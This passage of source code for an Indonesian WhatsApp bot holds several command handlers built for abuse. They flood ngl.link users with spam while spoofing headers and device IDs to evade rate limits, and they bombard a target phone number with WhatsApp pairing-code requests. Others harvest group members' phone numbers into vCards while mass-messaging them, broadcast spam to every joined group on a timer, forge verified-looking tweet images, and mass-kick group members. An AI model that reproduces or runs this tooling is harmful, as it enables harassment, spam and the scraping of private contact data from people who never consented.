// wm avz
        const data = await avis.text();
        const avv = data.split("\n").map(line => {
            try {
                return JSON.parse(line.slice(6)).text;
            } catch (e) {
                return "";
            }
        });
// wm avz
        const avosky = avv.join("").trim();
        const avoskyy = `${avosky}`;
// wm avz
        return avoskyy.trim();
    } catch (error) {
        console.error("Error:", error);
        return null;
    }
}
// wm avz
async function avoskyyy(m, question) {
    const answer = await avvmx(question);
    if (answer) {
        m.reply(answer);
    } else {
        m.reply("Terjadi kesalahan.");
    }
}
// wm avz
const avosks = `${q}`  
avoskyyy(m, avosks);
}
break


case 'pantun':{
const jeson = await fetchJson('https://raw.githubusercontent.com/tanakasenn/Database-Json/refs/heads/main/Pantun.json')
let pantunnya = jeson[Math.floor(Math.random() * jeson.length)];
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: pantunnya
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: ''
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: ``,
                    subtitle: "Shikimori Asistent",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                        {
                            "name": "quick_reply",
                            "buttonParamsJson": `{\"display_text\":\"Next\",\"id\":\"${prefix}pantun\"}`
                        }
                      ],
                   }
                 )
               }
             )
          }
       }
    }, {
     quoted : m
   }
 )
await RuzXD.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break
case 'faketweet':{
const canvafy = require('canvafy')
if (!text) return reply(`Exmaple : Name1 | Name2 | Text`)
 nama1 = text.split("|")[0]
 nama2 = text.split("|")[1]
 katakata = text.split("|")[2]
const tweet = await new canvafy.Tweet()
  .setTheme("dim")
  .setUser({displayName: nama1, username: nama2})
  .setVerified(true)
  .setComment(katakata)
  .setAvatar(ppuser)
  .build();
 let tanaka = tweet
  RuzXD.sendMessage(m.chat, { image: tanaka, caption: 'Done' },{ quoted : m })     
}
break
case 'nglspam': {
if (!isOwner) return reply(msg.owner)
    if (!text.split("|")[0] || !text.split("|")[1] || !text.split("|")[2]) {
        return m.reply("Masukan username, pesan, dan jumlah spam!\nContoh: .nglspam shikimori|haloo|5");
    }
async function sendSpamMessage(username, message, spamCount) {
    let counter = 0;
    while (counter < spamCount) {
        try {
            const date = new Date();
            const minutes = date.getMinutes();
            const hours = date.getHours();
            const formattedDate = `${hours}:${minutes}`;
            const deviceId = crypto.randomBytes(21).toString('hex');
            const url = 'https://ngl.link/api/submit';
            const headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Referer': `https://ngl.link/${username}`,
                'Origin': 'https://ngl.link'
            };
            const body = `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`;

            const response = await fetch(url, {
                method: 'POST',
                headers,
                body,
                mode: 'cors',
                credentials: 'include'
            });

            if (response.status !== 200) {
                console.log(`[${formattedDate}] [Err] Ratelimited`);
                await new Promise(resolve => setTimeout(resolve, 25000));
            } else {
                counter++;
                console.log(`[${formattedDate}] [Msg] Sent: ${counter}`);
            }
        } catch (error) {
            console.error(`[${formattedDate}] [Err] ${error}`);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
};
    const [username, message, count] = text.split("|");
    const spamCount = parseInt(count, 10);

    if (isNaN(spamCount) || spamCount <= 0) {
        return m.reply("Jumlah spam harus berupa angka positif!");
    }

    try {
        await sendSpamMessage(username, message, spamCount);
        m.reply(`Sukses mengirim ${spamCount} pesan NGL ke ${username}`);
    } catch (e) {
        console.error(e); // Menambahkan logging error untuk debug
        return m.reply("Fitur error, coba lagi nanti.");
    }
}
break
case "kik": case "kick": {

if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isOwner) return reply(msg.owner)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await RuzXD.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => RuzXD.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => m.reply(err.toString()))
} else return m.reply(example('nomornya/@tag'))}
break
case "hidetag": case "z": case "h": {

if (!isGroup) return reply(msg.group)
if (!isOwner) return reply(msg.owner)
if (!m.quoted && !text) return m.reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
RuzXD.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case 'closetime':
if (!isGroup) return reply(msg.group)
if (!isAdmin) return reply("Khusus Admin Group")
if (!isBotAdmin) return reply(msg.adminbot)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
 reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
RuzXD.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break

case "opentime": {
if (!isGroup) return reply(msg.group)
if (!isAdmin) return reply("Khusus Admin Group")
if (!isBotAdmin) return reply(msg.adminbot)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
reply(`Open Time ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
const nomor = m.participant
const open = `*Tepat Waktu* Grup Dibuka Oleh Admin\nSekarang Member Dapat Mengirim Pesan`
RuzXD.groupSettingUpdate(m.chat, 'not_announcement')
reply(open)
}, timer)
}
break

case "open": {

if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isOwner) return reply(msg.owner)
await RuzXD.groupSettingUpdate(m.chat, 'not_announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Anggota Dapat Mengirim Pesan")
}
break
case "close": {

if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isOwner) return reply(msg.owner)
await RuzXD.groupSettingUpdate(m.chat, 'announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Hanya Admin Yang Dapat Mengirim Pesan")
}
break
case "del": case "delete": {

if (isGroup) {
if (!isOwner) return reply(msg.owner)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
RuzXD.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmin) return reply(msg.adminbot)
RuzXD.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return reply(msg.owner)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
RuzXD.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break
case "demote": case "demote": {

if (!isGroup) return reply(msg.group)
if (!isOwner) return reply(msg.owner)
if (!isBotAdmin) return reply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await RuzXD.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => m.reply(`Berhasil Memberhentikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))}
break
case "promote": case "promot": {

if (!isGroup) return reply(msg.group)
if (!isOwner) return reply(msg.owner)
if (!isBotAdmin) return reply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await RuzXD.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => m.reply(`Berhasil Menjadikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))}
break
case "owner": {
RuzXD.sendContact(m.chat, [owner], "Telfon/VC = Blokir", null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: await fs.readFileSync("./media/Menu.jpg"), 
title: `© Copyright ${global.namaowner}`, 
renderLargerThumbnail: true, 
sourceUrl: global.linkyt, 
mediaType: 1
}}})
}
break
case 'delgc':
    if (!isGroup) return m.reply('Khusus Group')
if (!isOwner) return m.reply(msg.owner)    
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./all/database/ruzgrup.json', JSON.stringify(pler))
m.reply(`*sukses sayang*💘🥴`)  
break
case 'addgc':
    if (!isGroup) return m.reply(`Khusus ayang ruztanku anj`)         
if (!isOwner) return m.reply(msg.owner)
pler.push(m.chat)
fs.writeFileSync('./all/database/ruzgrup.json', JSON.stringify(pler))
reply('Sukses Addgc Sayang💞')
break        
case 'kickall': {
 if (!m.isGroup) return m.reply('Fitur Khusus Group!')
 if (!isOwner) return m.reply('Fitur Khusus Owner & Admin!')
 if (!isBotAdmin) return m.reply('Saya Bukan Admin grup!')
  const kickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${owner}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${owner}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.welcome === true) {
 welcome = false;
  }
 for (let remove of kickall) {
 await RuzXD.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(3000);
 }
 m.reply(`Success`);
}
break
case "ambilq": {
let jsonData = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2)
reply(jsonData)
}

case 'autoai':{
RuzXD.Shikimori = RuzXD.Shikimori ? RuzXD.Shikimori : {};

    if (!text) return reply(`*Contoh:* .autoai *[on/off]*`);

    if (text === "on") {
        RuzXD.Shikimori[sender] = {
            messages: []
        };
        m.reply("[ ✓ ] Berhasil mengaktifkan bot Shikimori Asistent");
    } else if (text === "off") {
        delete RuzXD.Shikimori[sender];
        m.reply("[ ✓ ] Berhasil menonaktifkan bot Shikimori Asistent");
    }
};
break

case 'spam-pairing': {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(`*Example:* ${prefix + command} +628xxxxxx|150`)
reply(msg.wait)
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break
case "listgc": case "cekidgc": case"listgrup": {
if (!isOwner) return m.reply(msg.owner)
let gcall = Object.values(await RuzXD.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
RuzXD.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(thumb), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: linkyt, previewType: "PHOTO"}}}, {quoted: qkontak})
}
break
case "pushkontak2": {
    if (!isOwner) return reply(msg.owner)
    if (!text) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
    if (!text.split("|")) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
    
    var [idnya, teks] = text.split("|")
    var groupMetadataa
    try {
        groupMetadataa = await RuzXD.groupMetadata(`${idnya}`)
    } catch (e) {
        return m.reply("*ID Grup* tidak valid!")
    }
    
    const participants = await groupMetadataa.participants
    const halls = participants.map(v => v.id)
    let contacts = []
    
    m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
    for (let mem of halls) {
        if (mem !== m.sender) {
            contacts.push(mem)
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: "bang"
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "",
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                hasMediaAttachment: false
                            }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: [{
                                    body: proto.Message.InteractiveMessage.Body.fromObject({
                                        text: "",
                                    }),
                                    footer: proto.Message.InteractiveMessage.Footer.create({
                                        text: namabot
                                    }),
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: teks,
                                        hasMediaAttachment: true,
                                        ...(await prepareWAMessageMedia({
                                            image: global.imgmenu,
                                        }, {
                                            upload: RuzXD.waUploadToServer
                                        }))
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: JSON.stringify({
                                                    display_text: "𝐌𝐲 𝐘𝐨𝐮𝐭𝐮𝐛𝐞",
                                                    url: "https://www.youtube.com/@Ruztanxd",
                                                    merchant_url: "https://www.youtube.com/@Ruztanxd"
                                                })
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: JSON.stringify({
                                                    display_text: "𝐌𝐲 𝐒𝐚𝐥𝐮𝐫𝐚𝐧",
                                                    url: "https://whatsapp.com/channel/0029Vagk8AMKrWR5wAmiq745",
                                                    merchant_url: "https://whatsapp.com/channel/0029Vagk8AMKrWR5wAmiq745"
                                                })
                                            }
                                        ]
                                    })
                                }]
                            })
                        })
                    }
                }
            }, {})

            // Kirim pesan
            await RuzXD.relayMessage(
                mem, msg.message, {
                    messageId: msg.key.id
                })
            await sleep(8000) // Delay
        }
    }
    try {
        const uniqueContacts = [...new Set(contacts)]
        await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(uniqueContacts))
        const vcardContent = uniqueContacts.map((contact, index) => {
            const vcard = [
                "BEGIN:VCARD",
                "VERSION:3.0",
                `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
                `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                "END:VCARD",
                ""
            ].join("\n")
            return vcard
        }).join("\n")
        fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
        
        m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
        await RuzXD.sendMessage(m.sender, {
            document: fs.readFileSync("./all/database/contacts.vcf"),
            fileName: "contacts.vcf",
            caption: "File Contact Berhasil Dibuat✅",
            mimetype: "text/vcard",
        }, { quoted: m })
        contacts.splice(0, contacts.length)
        await fs.writeFileSync("./all/database/contacts.json", JSON.stringify([]))
        await fs.writeFileSync("./all/database/contacts.vcf", "")
    } catch (err) {
        m.reply(err.toString())
    }
}
break
case "pushkontak1": {

if (!isOwner) return reply(msg.owner)
if (!text) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await RuzXD.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))

await RuzXD.sendMessage(mem, {text: teks}, {quoted: null})
await sleep(8000)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await RuzXD.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak": {
if (!isOwner) return m.reply(msg.owner)
if (!isGroup) return m.reply(msg.group)
if (!text) return m.reply(`${command} save ${namaowner}`)
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await RuzXD.sendMessage(mem, {text: teks}, {quoted: null})
await sleep(8000) // Delayy nya 8000=8Detik
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:${namaowner}>[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await RuzXD.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "done": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(`${command} barang,harga\n\n*Contoh :* Panel Unlimited,2`)
if (!text.split(",")) return m.reply("done barang,harga\n\n*Contoh :* Panel Unlimited,2")
const [barang, harga] = text.split(",")
if (isNaN(harga)) return m.reply("Format Harga Tidak Valid")
var total = `${harga}000000`
var total2 = Number(`${harga}000`)
const teks = `*TRANSAKSI DONE BY ${namaowner} ✅*

*📦 Barang :* ${barang}
*💸 Nominal :* Rp${toRupiah(total2)}
*⏰ Waktu :* ${getTime().split("T")[0]}

_*Terimakasih Sudah Mempercayai & Menggunakan Jasa Saya 🥳*_`
 RuzXD.relayMessage(m.chat,  {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: Number(total), requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: `${teks}`, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}
break
case "jpmtesti": {
if (!isOwner) return reply(msg.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const blacklist = JSON.parse(fs.readFileSync('./blacklist.json', 'utf8'));

const allgrup = await RuzXD.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await RuzXD.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
        if (blacklist.includes(i)) {
            reply(`Grup ${i} dilewati karena ada di blacklist.`);
            continue;
        }
try {
await RuzXD.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namabot, newsletterJid: global.idsaluran }}}, {quoted: qtext2})
count += 1
} catch {}
await sleep(8000)
}
await fs.unlinkSync(rest)
await RuzXD.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break
case "jpm": {
if (!isOwner) return reply(msg.owner)
if (!q) return m.reply(example("teksnya"))
const blacklist = JSON.parse(fs.readFileSync('./blacklist.json', 'utf8'));
let allgrup = await RuzXD.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
        if (blacklist.includes(i)) {
            reply(`Grup ${i} dilewati karena ada di blacklist.`);
            
            continue;
        }
try {
await RuzXD.sendMessage(i, {text: `${teks}`}, {quoted: qtext2})
count += 1
} catch {}
await sleep(8000)
}
await RuzXD.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break
case "jpm2": {
if (!isOwner) return reply(msg.owner)
if (!q) return m.reply(example("teksnya"))
const blacklist = JSON.parse(fs.readFileSync('./blacklist.json', 'utf8'));
let allgrup = await RuzXD.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
        if (blacklist.includes(i)) {
            reply(`Grup ${i} dilewati karena ada di blacklist.`);
            
            continue;
        }
    const media = fs.readFileSync('./media/Menu.jpg');
try {
await RuzXD.sendMessage(
i,
{
image: media,
caption: teks, 
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "Shikimori Assistant",
newsletterJid: global.idsaluran,
i},
                        externalAdReply: {
                            title: `© Shikimori Assistant`,
                            body: '',
                            thumbnailUrl: thumb,
                            sourceUrl: global.sgc,
                            mediaType: 1,
                            renderLargerThumbnail: true,
                        },
                    },
                },
                { quoted: qkontak }
            );
         //   await sleep(8000); // Delay 8 detik
      count += 1
      } catch {}
await sleep(8000)
}
await RuzXD.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})        
    }
break
case "autojpm": {
    if (!isOwner) return reply(msg.owner);
    const blacklist = JSON.parse(fs.readFileSync('./blacklist.json', 'utf8'));
    const media = fs.readFileSync('./media/Menu.mp4');
    const jid = m.chat;

    async function sendJPM() {
        let allgrup = await RuzXD.groupFetchAllParticipating();
        let res = Object.keys(allgrup);
        let count = 0;

        if (!teks) return reply("Teks JPM belum diatur. Gunakan perintah *autojpm* dengan format yang benar.");

        await reply(`Memproses *JPM* teks ke ${res.length} grup...`);

        for (let i of res) {
            if (blacklist.includes(i)) {
                console.log(`Grup ${i} dilewati karena ada di blacklist.`);
                continue;
            }
            try {
                await RuzXD.sendMessage(
                    i,
                    {
                        video: media,
                        caption: teks,
                        gifPlayback: true,
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true,
                        },
                        externalAdReply: {
                            title: `© Shikimori Assistant`,
                            body: '',
                            mediaType: 2,
                            thumbnailUrl: thumb,
                            sourceUrl: global.sgc,
                        },
                    },
                    { quoted: qkontak }
                );

                count += 1;
            } catch (err) {
                console.error(`Gagal mengirim ke grup ${i}:`, err);
            }
            await sleep(8000); // Jeda 8 detik per grup
        }

        await RuzXD.sendMessage(
            jid,
            { text: `*JPM Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}` },
            { quoted: m }
        );
        console.log(`JPM selesai untuk ${count} grup.`);
    }

    async function startAutoJPM() {
        if (isJPMRunning) return reply("JPM otomatis sudah berjalan.");
        isJPMRunning = true;

        while (stokJPM > 0) {
            await sendJPM();
            stokJPM -= 1;
            console.log(`Stok JPM tersisa: ${stokJPM}`);
            if (stokJPM > 0) {
                reply("Menunggu 5 menit sebelum memulai JPM lagi...");
                await sleep(300000) // Jeda 5menit sebelum mengulang JPM ygy
            }
        }

        isJPMRunning = false;
        reply("JPM otomatis selesai karena stok habis.");
    }

    if (args[0] === "stop") {
        stokJPM = 0;
        isJPMRunning = false;
        reply("JPM otomatis dihentikan.");
    } else {
        const input = args.join(' ');
        const [stokArg, teksArg] = input.split('|').map(item => item.trim());

        if (!stokArg || isNaN(stokArg)) return reply("Masukkan teks JPM setelah tanda '|'. Contoh: .autojpm 5|halo");
        if (!teksArg) return reply("Masukkan teks JPM setelah tanda '|'. Contoh: .autojpm 5|halo");

        stokJPM = parseInt(stokArg);
        teks = teksArg;
        saveJPMConfig({ teks, stokJPM }); 
        reply(`Stok JPM diatur menjadi ${stokJPM} dan teks JPM diatur:\n\n"${teks}"\n\nMemulai JPM otomatis...`);
        startAutoJPM();
    }
}
break
case "jpm3": {
    if (!isOwner) return reply(msg.owner);
    if (!q) return m.reply(example("teksnya"));

    const blacklist = JSON.parse(fs.readFileSync('./blacklist.json', 'utf8'));
    let allgrup = await RuzXD.groupFetchAllParticipating();
    let res = Object.keys(allgrup);
    let count = 0;
    const jid = m.chat;
    const teks = text;

    await reply(`Memproses *jpm* teks ke ${res.length} grup...`);
    const media = fs.readFileSync('./media/Menu.mp4');
    for (let i of res) {
        if (blacklist.includes(i)) {
            reply(`Grup ${i} dilewati karena ada di blacklist.`);
            continue;
        }
        try {
            await RuzXD.sendMessage(
                i,
                {
                    video: media,
                    caption: teks,
                    gifPlayback: true,
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                    },
                    externalAdReply: {
                        title: `© Shikimori Assistant`,
                        body: '',
                        mediaType: 2,
                        thumbnailUrl: thumb,
                        sourceUrl: global.sgc,
                    },
                },
                { quoted: qkontak }
            );

            count += 1;
        } catch (err) {
            console.error(`Gagal mengirim ke grup ${i}:`, err);
        }
        await sleep(8000);
    }
    await RuzXD.sendMessage(
        jid,
        { text: `*JPM Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}` },
        { quoted: m }
    );
}
break;

case "pushkontakvip": {
    if (!isOwner) return m.reply(msg.owner);
    if (!isGroup) return m.reply(msg.group);
    if (!text) return m.reply(`${command} save ${namaowner}`);
    var teks = text;

    // Mendapatkan semua peserta grup
    const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
    m.reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`);

    for (let mem of halls) {
        if (mem !== m.sender) {
            contacts.push(mem);
            await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts));
            const media = fs.readFileSync('./media/Menu.jpg');
            await RuzXD.sendMessage(
                mem,
                {
                    image: media,
                    caption: teks, 
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "Shikimori Assistant",
                            newsletterJid: global.idsaluran,
                        },
                        externalAdReply: {
                            title: `© Shikimori Assistant`,
                            body: '',
                            thumbnailUrl: thumb,
                            sourceUrl: global.sgc, 
                            mediaType: 1,
                            renderLargerThumbnail: true,
                        },
                    },
                },
                { quoted: qkontak }
            );
            await RuzXD.sendMessage(
                mem,
                {
                    audio: fs.readFileSync('./media/menu.mp3'),
                    mimetype: 'audio/mpeg',
                    ptt: true,
                    viewOnce: false,
                },
                { quoted: null }
            );

            await sleep(8000); // Delay 8 detik
        }
    }

    try {
        const uniqueContacts = [...new Set(contacts)];
        const vcardContent = uniqueContacts.map((contact, index) => {
            const vcard = [
                "BEGIN:VCARD",
                "VERSION:3.0",
